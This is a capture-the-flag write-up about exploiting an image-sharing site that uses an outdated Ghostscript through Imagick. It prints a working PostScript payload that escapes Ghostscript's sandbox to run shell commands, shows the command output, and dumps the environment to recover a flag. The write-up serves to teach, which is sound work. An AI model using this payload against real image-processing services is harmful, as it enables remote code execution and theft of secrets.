# shell-in-the-ghost writeup

We are tasked to extract a secret from a public sharing image websites. When visiting the website we are greeted with an upload form and a list of previous uploads. When we upload an image, it gets added to the list. One important thing to note is that for each upload a thumbnail gets created. At the end of the page we find "Powered by PHP 7.2, Imagick 6.9.7.4 and GhostScript 9.22". Given that the name of this challenge is "Shell in the ghost", this last application is very interesting. Searching the name on google/duckduckgo/..., we find that it is an interpreter for the PostScript language and PDFs, and has had many security bugs in the past. The version this site seems to be running is an older GhostScript version, probably vulnerable to many exploits.

The exploit we will be using today is the first exploit of https://www.openwall.com/lists/oss-security/2018/08/21/2. Essentially, GhostScript support sandboxing to prevent executing arbitrary commands amongst other things. However, under certain conditions triggered by exception handling logic, it is possible to disable these restrictions entirely. Since the image sharing site references Imagick as well, we presumably need to use the Imagick versions of the exploit. Indeed, if we upload "shell_exec.ps" with the following contents

```postscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

we get an error, and in the 500 response to the upload we find

```
uid=1000(application) gid=1000(application) groups=1000(application)
Error generating thumbnail
```

Clearly our exploit has worked and we have shell access. Experimenting with some commands, we find that there is a file named 'secret.php'. This could contain the flag we are looking for. If we visit this file with our browser, we get "I won't tell you" as response. However, as we have shell access, we can just cat the file:

```php
<?php

$secret = $_ENV["FLAG"];

die("I won't tell you");

echo "FLG{$secret}";
```

The flag is stored in the environment, so with one final upload of our postscript file, now loaded with the `env` command, we get:

```
CONTAINER_UID=application
USER=application
SUPERVISOR_GROUP_NAME=php-fpm
HOSTNAME=9ad55e463e6b
WEB_DOCUMENT_ROOT=/app
SHLVL=0
HOME=/home/application
DOCKER_CONF_HOME=/opt/docker/
APPLICATION_GROUP=application
APPLICATION_USER=application
WEB_PHP_TIMEOUT=600
LOG_STDERR=/proc/1/fd/2
WEB_DOCUMENT_INDEX=index.php
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APPLICATION_GID=1000
LANG=C.UTF-8
SUPERVISOR_ENABLED=1
LOG_STDOUT=/proc/1/fd/1
SUPERVISOR_SERVER_URL=unix:///.supervisor.sock
SUPERVISOR_PROCESS_NAME=php-fpmd
WEB_ALIAS_DOMAIN=*.vm
LC_ALL=C.UTF-8
PWD=/app
APPLICATION_PATH=/app
APPLICATION_UID=1000
WEB_PHP_SOCKET=127.0.0.1:9000
FLAG=f4e917a7d07bf5c2007f162ae041b0f41f541e0d36a7
```
